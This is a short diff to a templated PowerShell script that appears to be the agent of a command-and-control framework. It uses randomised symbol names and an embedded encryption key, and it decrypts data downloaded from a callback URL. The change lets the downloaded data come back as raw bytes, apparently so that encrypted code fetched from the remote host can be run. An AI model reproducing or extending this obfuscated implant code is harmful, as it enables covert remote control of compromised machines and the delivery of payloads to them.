@@ -6,11 +6,11 @@ ${{symbol_name("KEY")}} = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")
 
 function {{symbol_name("Decrypt-String")}} {
     param(
-        [System.String]$string
+        [System.String]$string, [Bool]$Code=$False
   	)
     $result = [System.Convert]::FromBase64String($string)
     $result = {{symbol_name("Decrypt-Code")}} $result ${{symbol_name("KEY")}}
-    $result = [System.Text.Encoding]::UTF8.GetString($result)
+    if (-not $Code) { $result = [System.Text.Encoding]::UTF8.GetString($result) }
     $result
 }
 
@@ -46,10 +46,10 @@ if ($PSVersionTable.PSVersion.Major -ge 5) {
 {% if transport in ['http', 'https'] %}
     ${{symbol_name("WebClient")}} = $K{# defined in the launcher #}
     function {{symbol_name("Transport-String")}} {
-        param([String]$1, [hashtable]$2)
+        param([String]$1, [hashtable]$2, [Bool]$Code=$False)
         $args = "?t={{transport}}"
         foreach($k in $2.keys) { $args += "&$k=$($2[$k])" }
-        return {{symbol_name("Decrypt-String")}} (${{symbol_name("WebClient")}}.DownloadString("${{symbol_name("CALLBACK_URL")}}${1}${args}"))
+        return {{symbol_name("Decrypt-String")}} (${{symbol_name("WebClient")}}.DownloadString("${{symbol_name("CALLBACK_URL")}}${1}${args}")) $Code
     }
 {% elif transport == 'smb' %}
     {# TODO #}
